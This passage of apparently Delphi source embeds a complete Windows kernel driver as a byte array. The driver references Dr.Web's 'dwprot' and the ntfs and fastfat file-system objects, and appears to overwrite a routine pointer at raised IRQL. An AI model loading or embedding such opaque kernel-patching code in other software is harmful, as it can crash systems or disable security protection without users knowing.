    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00
    );

  driver_data: array[0..4607] of byte = (
    $4D, $5A, $90, $00, $03, $00, $00, $00, $04, $00, $00, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $E0, $00, $00, $00,
    $0E, $1F, $BA, $0E, $00, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $54, $68,
    $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $63, $61, $6E, $6E, $6F,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $69, $6E, $20, $44, $4F, $53, $20,
    $6D, $6F, $64, $65, $2E, $0D, $0D, $0A, $24, $00, $00, $00, $00, $00, $00, $00,
    $5F, $3D, $C4, $F3, $1B, $5C, $AA, $A0, $1B, $5C, $AA, $A0, $1B, $5C, $AA, $A0,
    $12, $24, $2E, $A0, $1A, $5C, $AA, $A0, $D8, $53, $A5, $A0, $1A, $5C, $AA, $A0,
    $D8, $53, $F5, $A0, $19, $5C, $AA, $A0, $12, $24, $39, $A0, $1E, $5C, $AA, $A0,
    $1B, $5C, $AB, $A0, $00, $5C, $AA, $A0, $12, $24, $23, $A0, $19, $5C, $AA, $A0,
    $12, $24, $3B, $A0, $1A, $5C, $AA, $A0, $52, $69, $63, $68, $1B, $5C, $AA, $A0,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $05, $00, $96, $87, $D4, $4B, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $02, $01, $0B, $01, $09, $00, $00, $06, $00, $00,
    $00, $0A, $00, $00, $00, $00, $00, $00, $4A, $12, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $05, $00, $00, $00, $05, $00, $00, $00, $05, $00, $00, $00, $00, $00, $00, $00,
    $00, $60, $00, $00, $00, $04, $00, $00, $E1, $96, $00, $00, $01, $00, $00, $00,
    $00, $00, $10, $00, $00, $10, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $3C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $B8, $20, $00, $00, $40, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $44, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $2E, $74, $65, $78, $74, $00, $00, $00,
    $99, $03, $00, $00, $00, $10, $00, $00, $00, $04, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $68,
    $2E, $72, $64, $61, $74, $61, $00, $00, $14, $01, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $08, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $48, $2E, $64, $61, $74, $61, $00, $00, $00,
    $20, $04, $00, $00, $00, $30, $00, $00, $00, $04, $00, $00, $00, $0A, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $C8,
    $49, $4E, $49, $54, $00, $00, $00, $00, $B2, $01, $00, $00, $00, $40, $00, $00,
    $00, $02, $00, $00, $00, $0E, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $20, $00, $00, $E2, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $DC, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $42,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $8B, $FF, $55, $8B, $EC, $83, $EC, $0C, $83, $65, $FC, $00, $68, $18, $32, $40,
    $00, $8D, $45, $F4, $50, $FF, $15, $2C, $20, $40, $00, $8D, $45, $FC, $50, $A1,
    $0C, $20, $40, $00, $6A, $00, $6A, $00, $FF, $30, $8D, $45, $F4, $6A, $40, $6A,
    $00, $6A, $40, $50, $FF, $15, $20, $20, $40, $00, $85, $C0, $7C, $09, $8B, $4D,
    $FC, $FF, $15, $30, $20, $40, $00, $8B, $45, $FC, $C9, $C3, $8B, $FF, $55, $8B,
    $EC, $56, $8B, $71, $04, $33, $C0, $EB, $18, $8B, $4E, $08, $3B, $4D, $08, $75,
    $0B, $85, $C0, $74, $07, $50, $FF, $15, $1C, $20, $40, $00, $8B, $C6, $8B, $76,
    $10, $85, $F6, $75, $E4, $5E, $5D, $C2, $04, $00, $68, $98, $00, $00, $00, $68,
    $08, $21, $40, $00, $E8, $43, $02, $00, $00, $83, $65, $FC, $00, $68, $50, $13,
    $40, $00, $8D, $45, $D8, $50, $FF, $15, $2C, $20, $40, $00, $6A, $7F, $6A, $00,
    $8D, $85, $58, $FF, $FF, $FF, $50, $E8, $1A, $02, $00, $00, $83, $C4, $0C, $83,
    $4D, $E4, $FF, $8D, $45, $E0, $50, $6A, $7F, $8D, $85, $58, $FF, $FF, $FF, $50,
    $6A, $02, $8D, $45, $D8, $50, $FF, $75, $08, $FF, $15, $10, $20, $40, $00, $85,
    $C0, $7C, $16, $8B, $85, $64, $FF, $FF, $FF, $89, $45, $E4, $EB, $0B, $33, $C0,
    $40, $C3, $8B, $65, $E8, $83, $4D, $E4, $FF, $83, $4D, $FC, $FF, $8B, $45, $E4,
    $E8, $12, $02, $00, $00, $C2, $04, $00, $8B, $FF, $55, $8B, $EC, $83, $EC, $30,
    $53, $56, $57, $33, $DB, $68, $08, $02, $00, $00, $53, $BE, $18, $32, $40, $00,
    $56, $89, $5D, $F8, $E8, $AD, $01, $00, $00, $BF, $20, $13, $40, $00, $83, $C4,
    $0C, $8B, $D7, $8B, $CE, $E8, $44, $01, $00, $00, $BA, $40, $13, $40, $00, $8B,
    $CE, $E8, $74, $01, $00, $00, $E8, $C5, $FE, $FF, $FF, $89, $45, $F4, $3B, $C3,
    $0F, $84, $FD, $00, $00, $00, $8B, $45, $08, $8B, $50, $04, $8B, $CE, $E8, $1B,
    $01, $00, $00, $56, $8D, $45, $E8, $50, $FF, $15, $2C, $20, $40, $00, $8D, $45,
    $E8, $89, $45, $D8, $8D, $45, $D0, $50, $68, $3F, $00, $0F, $00, $8D, $45, $FC,
    $50, $C7, $45, $D0, $18, $00, $00, $00, $89, $5D, $D4, $C7, $45, $DC, $40, $00,
    $00, $00, $89, $5D, $E0, $89, $5D, $E4, $FF, $15, $28, $20, $40, $00, $85, $C0,
    $7C, $61, $FF, $75, $FC, $E8, $E0, $FE, $FF, $FF, $8B, $0D, $34, $20, $40, $00,
    $89, $45, $08, $3B, $01, $76, $43, $83, $F8, $FF, $74, $3E, $53, $8D, $45, $F8,
    $50, $53, $53, $53, $FF, $75, $FC, $FF, $15, $18, $20, $40, $00, $85, $C0, $7C,
    $29, $8B, $4D, $F8, $8B, $59, $F0, $FF, $15, $30, $20, $40, $00, $FF, $15, $00,
    $20, $40, $00, $88, $45, $F0, $8B, $45, $08, $FF, $75, $F0, $89, $83, $9C, $00,
    $00, $00, $FF, $15, $04, $20, $40, $00, $33, $DB, $FF, $75, $FC, $FF, $15, $14,
    $20, $40, $00, $8B, $D7, $8B, $CE, $E8, $72, $00, $00, $00, $BA, $60, $13, $40,
    $00, $8B, $CE, $E8, $A2, $00, $00, $00, $E8, $F3, $FD, $FF, $FF, $3B, $C3, $74,
    $0A, $FF, $75, $F4, $8B, $C8, $E8, $31, $FE, $FF, $FF, $8B, $D7, $8B, $CE, $E8,
    $4A, $00, $00, $00, $BA, $70, $13, $40, $00, $8B, $CE, $E8, $7A, $00, $00, $00,
    $E8, $CB, $FD, $FF, $FF, $3B, $C3, $74, $0A, $FF, $75, $F4, $8B, $C8, $E8, $09,
    $FE, $FF, $FF, $5F, $5E, $5B, $C9, $C2, $04, $00, $8B, $FF, $55, $8B, $EC, $90,
    $68, $80, $13, $40, $00, $FF, $15, $24, $20, $40, $00, $59, $FF, $75, $0C, $E8,
    $94, $FE, $FF, $FF, $B8, $89, $01, $00, $C0, $5D, $C2, $08, $00, $CC, $57, $56,
    $8B, $F1, $8B, $FA, $83, $C9, $FF, $33, $C0, $F2, $66, $AF, $F7, $D1, $03, $C9,
    $8B, $FE, $8B, $F2, $8B, $C7, $8B, $D1, $C1, $E9, $02, $F2, $A5, $8B, $CA, $83,
    $E1, $03, $F2, $A4, $5E, $5F, $C3, $CC, $8B, $D7, $8B, $F9, $83, $C9, $FF, $33,
    $C0, $F2, $66, $AF, $8D, $47, $FE, $8B, $FA, $C3, $8B, $FF, $56, $57, $8B, $FA,
    $8B, $F1, $E8, $E1, $FF, $FF, $FF, $8B, $D7, $8B, $C8, $E8, $AE, $FF, $FF, $FF,
    $5F, $8B, $C6, $5E, $C3, $CC, $FF, $25, $38, $20, $40, $00, $68, $18, $13, $40,
    $00, $64, $A1, $00, $00, $00, $00, $50, $8B, $44, $24, $10, $89, $6C, $24, $10,
    $8D, $6C, $24, $10, $2B, $E0, $53, $56, $57, $8B, $45, $F8, $89, $65, $E8, $50,
    $8B, $45, $FC, $C7, $45, $FC, $FF, $FF, $FF, $FF, $89, $45, $F8, $8D, $45, $F0,
    $64, $A3, $00, $00, $00, $00, $C3, $8B, $4D, $F0, $64, $89, $0D, $00, $00, $00,
    $00, $59, $5F, $5E, $5B, $C9, $51, $C3, $FF, $25, $3C, $20, $40, $00, $CC, $CC,
    $5C, $00, $46, $00, $69, $00, $6C, $00, $65, $00, $53, $00, $79, $00, $73, $00,
    $74, $00, $65, $00, $6D, $00, $5C, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $64, $00, $77, $00, $70, $00, $72, $00, $6F, $00, $74, $00, $00, $00, $CC, $CC,
    $50, $00, $61, $00, $72, $00, $73, $00, $65, $00, $00, $00, $CC, $CC, $CC, $CC,
    $6E, $00, $74, $00, $66, $00, $73, $00, $00, $00, $CC, $CC, $CC, $CC, $CC, $CC,
    $66, $00, $61, $00, $73, $00, $74, $00, $66, $00, $61, $00, $74, $00, $00, $00,
    $44, $6F, $63, $74, $6F, $72, $20, $57, $65, $62, $20, $A9, $20, $32, $30, $30,
    $33, $20, $97, $20, $32, $30, $31, $30, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $66, $41, $00, $00, $7E, $41, $00, $00, $00, $00, $00, $00, $C0, $40, $00, $00,
    $D6, $40, $00, $00, $E8, $40, $00, $00, $F2, $40, $00, $00, $AE, $40, $00, $00,
    $26, $41, $00, $00, $40, $41, $00, $00, $4C, $41, $00, $00, $96, $40, $00, $00,
    $0E, $41, $00, $00, $80, $40, $00, $00, $94, $41, $00, $00, $9E, $41, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $30, $31, $32, $33, $34, $35, $36, $37,
    $38, $39, $41, $42, $43, $44, $45, $46, $00, $00, $00, $00, $30, $00, $31, $00,
    $32, $00, $33, $00, $34, $00, $35, $00, $36, $00, $37, $00, $38, $00, $39, $00,
    $41, $00, $42, $00, $43, $00, $44, $00, $45, $00, $46, $00, $00, $00, $00, $00,
    $71, $03, $00, $00, $20, $0F, $00, $00, $1F, $00, $00, $00, $1C, $00, $00, $00,
    $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00,
    $1F, $00, $00, $00, $1F, $00, $00, $00, $1E, $00, $00, $00, $1F, $00, $00, $00,
    $1E, $00, $00, $00, $1F, $00, $00, $00, $48, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $32, $40, $00, $00, $21, $40, $00, $01, $00, $00, $00,
    $18, $13, $00, $00, $00, $00, $00, $00, $FF, $FF, $FF, $FF, $DE, $10, $40, $00,
    $E2, $10, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $01, $01, $01, $01, $02, $10, $00, $00, $01, $01, $01, $01, $02, $10, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $01, $01, $00, $00, $00, $00, $10, $11, $02, $03, $00, $00, $00, $00,
    $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02, $02,
    $03, $11, $03, $03, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $14, $00, $00, $00, $00, $00,
    $10, $10, $10, $10, $00, $00, $00, $00, $02, $10, $00, $00, $00, $00, $00, $00,
    $02, $02, $02, $02, $02, $02, $02, $02, $10, $10, $10, $10, $10, $10, $10, $10,
    $03, $03, $04, $00, $01, $01, $03, $11, $06, $00, $04, $00, $00, $02, $00, $00,
    $01, $01, $01, $01, $02, $02, $00, $00, $20, $20, $20, $20, $20, $20, $20, $20,
    $02, $02, $02, $02, $02, $02, $02, $02, $50, $50, $14, $02, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $01, $01, $00, $00, $00, $00, $00, $00, $01, $41,
    $01, $01, $01, $01, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $03,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $00, $01, $00, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $03, $03, $03, $03, $01, $01, $01, $00, $00, $00, $00, $00, $01, $01, $01, $01,
    $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50, $50,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $00, $00, $00, $01, $03, $01, $00, $00, $00, $00, $00, $01, $03, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $00, $00, $03, $01, $01, $01, $01, $01,
    $01, $01, $03, $01, $03, $03, $03, $01, $00, $00, $00, $00, $00, $00, $00, $00,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01,
    $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $01, $00,
    $40, $BB, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $48, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $58, $41, $00, $00,
    $0C, $20, $00, $00, $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $8C, $41, $00, $00, $00, $20, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $66, $41, $00, $00,
    $7E, $41, $00, $00, $00, $00, $00, $00, $C0, $40, $00, $00, $D6, $40, $00, $00,
    $E8, $40, $00, $00, $F2, $40, $00, $00, $AE, $40, $00, $00, $26, $41, $00, $00,
    $40, $41, $00, $00, $4C, $41, $00, $00, $96, $40, $00, $00, $0E, $41, $00, $00,
    $80, $40, $00, $00, $94, $41, $00, $00, $9E, $41, $00, $00, $00, $00, $00, $00,
    $B3, $00, $4D, $6D, $53, $79, $73, $74, $65, $6D, $52, $61, $6E, $67, $65, $53,
    $74, $61, $72, $74, $00, $00, $0A, $01, $52, $74, $6C, $49, $6E, $69, $74, $55,
    $6E, $69, $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00, $57, $00,
    $49, $6F, $44, $65, $74, $61, $63, $68, $44, $65, $76, $69, $63, $65, $00, $00,
    $5A, $00, $49, $6F, $44, $72, $69, $76, $65, $72, $4F, $62, $6A, $65, $63, $74,
    $54, $79, $70, $65, $00, $00, $C6, $01, $5A, $77, $51, $75, $65, $72, $79, $56,
    $61, $6C, $75, $65, $4B, $65, $79, $00, $37, $01, $5A, $77, $43, $6C, $6F, $73,
    $65, $00, $CB, $00, $4F, $62, $52, $65, $66, $65, $72, $65, $6E, $63, $65, $4F,
    $62, $6A, $65, $63, $74, $42, $79, $48, $61, $6E, $64, $6C, $65, $00, $CE, $00,
    $4F, $62, $66, $44, $65, $72, $65, $66, $65, $72, $65, $6E, $63, $65, $4F, $62,
    $6A, $65, $63, $74, $00, $00, $CC, $00, $4F, $62, $52, $65, $66, $65, $72, $65,
    $6E, $63, $65, $4F, $62, $6A, $65, $63, $74, $42, $79, $4E, $61, $6D, $65, $00,
    $27, $00, $44, $62, $67, $50, $72, $69, $6E, $74, $00, $00, $90, $01, $5A, $77,
    $4F, $70, $65, $6E, $4B, $65, $79, $00, $6E, $74, $6F, $73, $6B, $72, $6E, $6C,
    $2E, $65, $78, $65, $00, $00, $09, $00, $4B, $65, $52, $61, $69, $73, $65, $49,
    $72, $71, $6C, $54, $6F, $44, $70, $63, $4C, $65, $76, $65, $6C, $00, $07, $00,
    $4B, $65, $4C, $6F, $77, $65, $72, $49, $72, $71, $6C, $00, $68, $61, $6C, $2E,
    $64, $6C, $6C, $00, $07, $06, $6D, $65, $6D, $73, $65, $74, $00, $00, $E3, $05,
    $5F, $65, $78, $63, $65, $70, $74, $5F, $68, $61, $6E, $64, $6C, $65, $72, $33,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $40, $00, $00, $00, $0D, $30, $17, $30, $20, $30, $36, $30,
    $43, $30, $68, $30, $80, $30, $8E, $30, $98, $30, $CB, $30, $0C, $31, $1A, $31,
    $2B, $31, $5A, $31, $8A, $31, $9C, $31, $B9, $31, $C9, $31, $CF, $31, $E4, $31,
